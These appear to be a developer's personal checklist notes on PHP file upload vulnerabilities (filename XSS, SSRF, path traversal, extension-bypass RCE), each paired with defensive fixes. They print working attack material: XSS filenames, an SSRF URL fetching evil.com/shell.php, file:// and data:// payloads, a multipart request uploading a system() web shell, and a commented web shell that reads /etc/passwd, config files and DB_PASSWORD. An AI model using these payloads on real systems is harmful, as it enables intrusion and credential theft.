Whenever there is file upload, there could be vulnerabilities.

This is especially true if using PHP for file upload, although similar vulnerabilities are not limited to PHP. For this checklist, we will use PHP.

What is vulnerable on your local development may not on the server and vice versa. You want to check against the server. And when you migrate to another server, you need to that test that server as well. This depends on the vulnerability you patch of course (eg. file extension validation can happen at the code level and is independent of the OS)

Required Knowledge:
- Separating into an upload form and upload endpoint still doesn't make you more secured: You could have a PHP page that does it all (has upload form, displays the uploaded, and also handles the upload saving it to the server storage) - OR - You could have the PHP upload form submit the files to another PHP endpoint. The hacker can still sniff the endpoint that the upload form requests to. Then the hacker can send their own request and file to that endpoint. If it's an upload form that does it all, then based on the request header body, the hacker makes it act like it's receiving a file you just uploaded on their upload form.
- Must know about RCE. Refer to [[Vocab - Remote Code Execution RCE - Predefined, Dynamic, Interactive]]

Practice?
- If don't have an upload form, you can play with this unsecured upload form in the same environment where you would have code at (Keep the url super secret and delete once done playing!): [[Mock Practice - Upload Form]]


**How to use**:
- Turn on persistent table of contents.

---

## List of Upload Vulnerabilities

- Upload XSS via File Name
- Upload Error with Verbose Messages
- Upload with GET (Bad Practice)
- Server-Side Request Forgery (SSRF)
- Upload Arbitrary File Write with Path Traversal
- Upload File Type Bypass RCE (Remote code execution)
- Upload Unrestricted File Type RCE (Remote code execution)

### Upload XSS via File Name

An attacker could upload a file named:
```
"><img src=x onerror=alert(1)>.jpg
```

If that hack is successful, then we can involve single quotes:
```
"><img src=x onerror=alert('Hacked')>.jpg
```

Always use `htmlspecialchars()` on the filename wherever it is echoed. And always use it before saving to the database. This ensures that if your app later displays the database entry on a newer designed page where you forget to escape the filename, it remains protected from XSS vulnerabilities. By escaping html special characters, you do not allow the hacker to introduce script blocks:

Here’s what it does:

```
< becomes &lt;

> becomes &gt;

" becomes &quot;

' becomes &#039;

& becomes &amp;
```

You also need to decode any once encoded / double encoded / triple encoded code because hackers sometimes obscure the code in the url in order to bypass sanitation. Refer to the recursive decode until input value doesn't change code snippet at [[Sanitization of inputs (form inputs, url search param, etc)]]

### Upload Error with Verbose Messages

#### **Goal:** 
Check if errors leak sensitive server info.

#### How to test:  

- Try uploading:
	- A file larger than 5MB.
	- A file with a forbidden extension (like `.exe`).
	- Cause an intentional upload failure (kill your Wi-Fi mid-upload).

#### What to look for:
- If errors show **server paths**, **full PHP warnings**, or **raw error codes**, **they leak info to attackers**.

### Upload with GET (Bad Practice)

Using GET to upload content in PHP can lead to serious security vulnerabilities. Consider the following vulnerable code in `uploader.php`:

```php
file_put_contents('uploads/' . $_GET['filename'], $_GET['content']);
```

In this example, a hacker could exploit the endpoint to upload arbitrary code by sending a URL like:

```
https://example.com/uploader.php?filename=shell.php&content=<?php%20system($_GET['cmd']); ?>
```

This allows them to create a malicious PHP file (`shell.php`) that can execute system commands. For example, they could visit:

```
https://example.com/uploaded/shell.php?cmd=whoami
```

Once the malicious file is uploaded, the hacker can execute commands on the server, potentially revealing sensitive information like privileged usernames.

In addition, the hacker may try to obscure the url by encoding or double encoding or triple encoding, so that it isn't clear there is code in the search param. More information at [[Sanitization of inputs (form inputs, url search param, etc)]]

#### Solution:
To prevent such attacks, **never use GET to handle file uploads**. Instead, use POST for file uploads, and always validate and sanitize file names and contents before saving them to the server.

However if you MUST use GET, you have to sanitize by recursively decoding the search parameters ([[Sanitization of inputs (form inputs, url search param, etc)]]) and getting the basename then saving to only a specific folder.

### Upload with GET - Server-Side Request Forgery (SSRF)

Vulnerability index: [https://www.invicti.com/learn/server-side-request-forgery-ssrf/](https://www.invicti.com/learn/server-side-request-forgery-ssrf/)

At the backend, `GET` is not meant for uploading files. But careless code can let an attacker _simulate_ a file upload by misusing URL parameters in a way that **writes to the filesystem**. See [Upload - Why POST with multipart form-data is safer than GET]

This is what can happen as an External SSRF or an Internal SSFR:

#### External SSRF

External **SSRF (Server-Side Request Forgery)** occurs when an attacker manipulates a server into making an HTTP request to an external server that the attacker controls, often with the goal of exploiting vulnerabilities or gathering sensitive information. Mnemonic: The server is forged/tricked into making a request and the request comes from the victim's server, so it's a server-side request.

uploader.php:
```
if (isset($_GET['upload_url'])) {  
	$url = $_GET['upload_url'];  
	$contents = file_get_contents($url);  
	file_put_contents("uploaded/".basename($url), $contents);  
}
```

Then hacker visits:
https://yourdomain.com/uploader.php?upload_url=https://evil.com/shell.php

Where the upload url is to their own server's shell.php that can take in shell commands (interactive RCE) or runs hard-coded shell commands (predefined RCE).

PHP by default allows PHP functions to download remote files. The setting to override to "Off" in php.ini is `allow_url_fopen` which could enable/disable access to URL objects for `file_get_contents()`, `fopen()`, `include()`, and `require()`.

#### Solutions to External SSRF:

1. **Use POST for File Uploads**  
    Always use `POST` with `multipart/form-data` for file uploads instead of `GET`. This ensures that file content is handled securely, without misusing URL parameters.
    
2. Decode recursively
   URL may be encoded once/twice/thrice/etc. The `file_get_contents` etc works with these encoded URLs but regular expression matching (later in this solution) won't. Refer to recursive decoding at [[Sanitization of inputs (form inputs, url search param, etc)]]

3. **Block URLs with Regex**  
    Use a simple regular expression to block any URLs from being passed as parameters. This helps ensure that no URL can be used for SSRF or other malicious purposes.
    
    ```php
    if (preg_match('/https?:\/\/[^\s]+/', $_GET['upload_url'])) {
        die('Invalid URL.');
    }
    ```
    
4. **Disable Remote File Access in `php.ini`**  
    Ensure that `allow_url_fopen` is set to `Off` in your `php.ini` configuration to prevent PHP functions like `file_get_contents()` from accessing remote files.
    
    ```
    allow_url_fopen = Off
    ```

#### Internal SSRF

Internal **SSRF (Server-Side Request Forgery)** occurs when an attacker manipulates a server into making an HTTP request to internal resources such as at localhots or 127.0.0.1.

If your server fetches the URL specified by `upload_url`, an attacker could supply:
`https://yourdomain.com/uploader.php?upload_url=http://127.0.0.1/admin_panel`

Or:
`https://yourdomain.com/uploader.php?upload_url=http://localhost:8080/internal_api`

In this case, even though these URLs are not accessible externally, **your server** might still be able to access them because it’s making the request internally. This could expose sensitive internal systems or APIs that would normally be behind a firewall or not directly exposed to the public.

So even if the firewall cli blocked the port access from the internet, now it got worked around.

Another internal ssrf vector is the `file://` scheme:
- The `file://` protocol allows access to files on the local file system, which can be exploited in SSRF attacks to read sensitive files.
- Example: An attacker might try to access system files like `/etc/passwd` on Linux or `C:\Windows\System32\config\` on Windows by manipulating a URL to something like `file:///etc/passwd`.
- If the server follows a user-provided URL and fetches local files, it could expose sensitive information or configuration files to an attacker.
- For example:
```
http://yourserver.com/uploader.php?file=file:///etc/passwd
```

And another internal ssrf vector is the `data://` scheme:
- The `data://` protocol allows embedding small files or data directly into a URL in base64-encoded format. While often used for embedding data into web applications, it can also be misused for SSRF attacks.
- Attackers could use `data://` to execute code or inject malicious payloads, leading to various security vulnerabilities.
- If the server processes this as a valid file and executes it, it could run arbitrary code on the server, leading to remote code execution (RCE):
```
http://yourserver.com/uploader.php?file=data:text/plain;base64,<?php echo system('whoami'); ?>
```

#### Solutions to Internal SSRF:
- Recursively decode the input value in case hacker is obscuring with encoding once/twice/thrice/etc. Refer to [[Sanitization of inputs (form inputs, url search param, etc)]]
- THEN block access to localhost and internal IP addresses. For example, php:
```
$blocked_ips = ['127.0.0.1', 'localhost', '::1', '10.0.0.0', '192.168.0.0', '169.254.0.0'];
$parsed_url = parse_url($url);
$host = $parsed_url['host'];

if (in_array($host, $blocked_ips)) {
    die('Access to internal IP addresses or localhost is blocked.');
}
```
- OR THEN implement strict URL whitelisting to ensure requests are only made to trusted resources. For example, php:
```
$allowed_domains = ['trusted.com', 'api.yourdomain.com'];
$parsed_url = parse_url($url);
$host = $parsed_url['host'];

if (!in_array($host, $allowed_domains)) {
    die('URL not allowed.');
}
```
- Validate and sanitize user inputs to prevent attackers from exploiting any SSRF vectors. For example, php:
```
function sanitize_url($url) {
    // Remove invalid characters and schemes like 'file://' or 'data://'
    $url = filter_var($url, FILTER_SANITIZE_URL);
    
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        die('Invalid URL.');
    }

    // Check if the URL scheme is valid
    $parsed_url = parse_url($url);
    if (!in_array($parsed_url['scheme'], ['http', 'https'])) {
        die('Invalid URL scheme.');
    }

    return $url;
}

```
- Use WAFs which will detect SSRF attempts.
	- Configure your Web Application Firewall (WAF) to block common SSRF attack patterns. WAFs can detect malicious URL patterns, blocked IPs, or suspicious user input in HTTP requests.
	- **OWASP ModSecurity CRS (Core Rule Set)**: You can configure ModSecurity (WAF) with CRS to block SSRF attacks.
	- **Example WAF Rule:**
	```
	 `SecRule REQUEST_URI "@rx (localhost|127\.0\.0\.1|0\.0\.0\.0|169\.254)" "id:100000,deny,log,msg:'SSRF attempt blocked'"
	```
    
	^ This rule blocks requests attempting to access `localhost`, `127.0.0.1`, or other reserved IPs.

---

### Upload Arbitrary File Write with Path Traversal

#### **Goal:**
Check if the server lets you save a file _outside_ of `uploaded/`  from filenames that path traverses.
#### How to test:
- Try uploading a file with a **weird filename**, like:
	- `../../../test.txt`
	- `..%2F..%2F..%2Ftest.txt` (URL encoded slashes)
- After uploading, check if `test.txt` appears **outside** the `uploaded/` folder (maybe higher in the directory tree).
  
- **If File Upload dialogue not showing the vector files**: In the browse dialogue, files starting with dot . may be hidden on Mac. Press CMD+SHIFT+. to reveal dotted files. If doesn’t show in browse dialogue still, you can drag and drop the file into the “Choose File” button like here, and the file upload status will update to your vector file's filename:
  ![[Pasted image 20250507203556.png]]

#### **What to look for:**
- If file is saved **outside** `uploaded/`, **path traversal is working** — bad.
- If it stays inside `uploaded/`, **you're safe** (but still need filename sanitization). But you must check again if you move to a new environment or server in the future.
	- If the files stay in the folder which is what we want, the system likely replaced the slashes with another character (since dot is still a common character for filenames):
	  ![[Pasted image 20250507203706.png]]
#### **Why it's dangerous:**
If the hacker is familiar with your system, the hacker could path traversal into where they can upload autostart scripts, or replace credentials, etc.
- For example `/app/config/initializers/malicious.rb`  would autostart a bad ruby script, and ruby has access to your server storage and shell
  
#### **How prevent:**
You could use regular expression to match for zero or more `../` and remove them, but keep in mind that encode and double encode has to be considered, and so does the permutations of mixing encoded and non-encoded characters (not to mention potentially mixing double encoded characters too) in the hacker's effort to bypass your validation. 

Use the script to recursively decode the input until it no longer changes, found in [[Sanitization of inputs (form inputs, url search param, etc)]].

Then you may use regular expression to remove zero or more `../` - OR - simply use basename() in PHP to extract only the filename `$safeName = basename($_FILES['file']['name']);` then placing into the appropriate uploaded folder.

This validation needs to be done at both frontend as well as backend.

---

### Upload File Type Bypass RCE (Remote code execution)

#### **Goal:** 
See if you can upload an **executable script** disguised as a safe file.
#### How to test:
- Create a simple PHP file (on your machine):
	```
	<?php echo "Hacked"; ?>
	```
- Save it as `hacked.php.jpg`.
- Upload it.
- Then try visiting directly for a RCE: `http://yourserver/uploaded/hacked.php.jpg`.
#### **What to look for:**
- If it downloads as an image, you're OK-ish.
- If it **executes PHP** (shows "Hacked" on the screen instead of downloading), **you have a serious security hole**!
#### **This is okay:**
![[Pasted image 20250507205336.png]]
#### **How to fix or avoid:**
You could fix in various ways. 
- One way is to have regular expression match then change all periods to hyphen except the final period (since that's the file extension). This needs to be done at both frontend and backend (so the hacker can't just target the backend with their own file and request after sniffing what the upload endpoint is.)
	- BUT - the user could have encoded once/twice/thrice/etc especially on the period (.), so recursively decode first:  [[Sanitization of inputs (form inputs, url search param, etc)]].
- Another way is to enforce strict file extension and MIME types. 
- Another way is to disable php execution in the uploads folder, and then get only basename from the user upload and place the upload only in that uploads folder.


### Upload Unrestricted File Type RCE (Remote code execution)

**Goal:** Check if any uploaded file is publicly accessible.
#### **How to test frontend:**

- Upload a `.php` file at the upload form and see if there are any errors
- Try browsing directly to your uploaded file at:
	- `http://yourserver/uploaded/yourfile.php`

#### **How to test backend:**

Hacker can use an API Request tool to upload the file to the backend directly. They could have sniffed the backend url when uploading files while having Network tab opened in Chrome DevTools.

Such API request tools could be:
- Insomniac
- Postman

The request could be:
```
POST /index.php HTTP/1.1  
Host: yourdomain.com  
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXYZ  
  
------WebKitFormBoundaryXYZ  
Content-Disposition: form-data; name="files[]"; filename="https://evil.com/shell.php"  
Content-Type: application/x-php  
  
<?php system($_GET['cmd']); ?>  
------WebKitFormBoundaryXYZ--
```

Then the hacker tries browsing directly to their uploaded file at:
`http://yourserver/uploaded/yourfile.php`

#### **What to look for:**
- Whether frontend and/or backend allowed the script file through.
- If you can **view it easily**, hackers can too.
- As you know, public access is OK _for some files_ (images, etc.), but it's **dangerous for scripts** that can execute and affect the server. Visiting the script in the web browser is enough to affect the server.

#### **What could go wrong**

Say the hacker uploads a php script either through the frontend or through the backend:
```
<?php  
// If a GET parameter "cmd" is set in the URL, execute it as a shell command on the server  
// This gives full Remote Code Execution (RCE) capability to the attacker  
if (isset($_GET['cmd'])) {  
    echo "Executing command: " . $_GET['cmd'] . "<br>";  
    echo "<code>";  
    system($_GET['cmd']);  
    echo "</code>";  
    echo "<br></br>";  
}  
?>  
  
<?php   
// Outputs full PHP configuration: extensions, environment, file paths, etc.  
// Can reveal sensitive settings like file paths, loaded modules, and configuration values  
?>  
<details>  
    <summary>PHP Info</summary>  
    <?php phpinfo(); ?>  
</details>  
<br/>  
  
<?php  
// Attempt to get the value of the DB_PASSWORD environment variable  
// If your app uses env vars for secrets (common in .env files or Docker), this may leak them  
echo getenv("DB_PASSWORD");    
  
// Output the absolute path to the web root directory (e.g., /var/www/html)  
// Helps attacker understand file structure for further traversal or exploitation  
echo $_SERVER['DOCUMENT_ROOT'];   
  
// Read and display the contents of /etc/passwd — a sensitive system file on Linux/Unix  
// Not directly harmful by itself (doesn't contain passwords), but useful for reconnaissance  
echo file_get_contents('/etc/passwd');   
  
// Try to read a configuration file in the parent directory  
// Often contains sensitive data like DB usernames/passwords if the file is accessible  
echo file_get_contents('../config.php');   
  
?>
```

They can visit the script directly to echo server sensitive information:
https://yourdomain.com/sandbox/info.php

![[Pasted image 20250507210956.png]]

And they can expand PHP info for:
![[Pasted image 20250507211014.png]]

And worse, they can run ANY shell. commands (if that’s not blocked):
[https://yourdomain.com/sandbox/info.php?cmd=ls%20../../../../../../../](https://yourdomain.com/sandbox/info.php?cmd=ls%20../../../../../../../)

![[Pasted image 20250507211053.png]]

But some setups may detect that:
![[Pasted image 20250507211110.png]]
#### Solution

Block php uploads. Or only whitelist acceptable file formats. Go even further: Rename files to hashed filename if your app won't break from that (so hacker bots can't automate hack attempts uploading then visiting an uploaded file with the expected same filename).

When you restrict filetype by validating against them, make sure to restrict in **both frontend and backend**. Same principles about the hacker sniffing the upload endpoint and requesting directly to that upload endpoint applies. For file extensions to blacklist or whitelist, refer to [[File extensions to blacklist or whitelist]].

## Highlights

- Whitelist / allow only specific file extensions and MIME at frontend where user interacts with Upload interface AS WELL as backend where the temp file is created and moved to final destination. 
- Here's an example of a "hacked.php" being uploaded, then the hacker can visit hacked.php to run various php functions that can access the server system or can take in url search parameters that passes to shell_exec:
  ![[Pasted image 20250508002108.png]]
- If you're blocking file uploads based on a blacklist of file extensions instead of using a whitelist, you can't just block common extensions and assume you're safe. For example, an ethical hacker was able to bypass a filter by uploading a file with a .pHp5 extension instead of .php. This worked because the validation didn't account for variations in capitalization and php version file extensions. Such issues can be mitigated by converting file extensions to lowercase before checking them and also safe guarding against php version extensions currently in existence (and future php version extensions).  
[https://sagarsajeev.medium.com/file-upload-bypass-to-rce-76991b47ad8f](https://sagarsajeev.medium.com/file-upload-bypass-to-rce-76991b47ad8f)
- Blocking the frontend is not enough. Hacker can still use API tools to make a POST request directly to your file upload backend endpoint if they inspect Network tab and/or code to figure out the endpoint.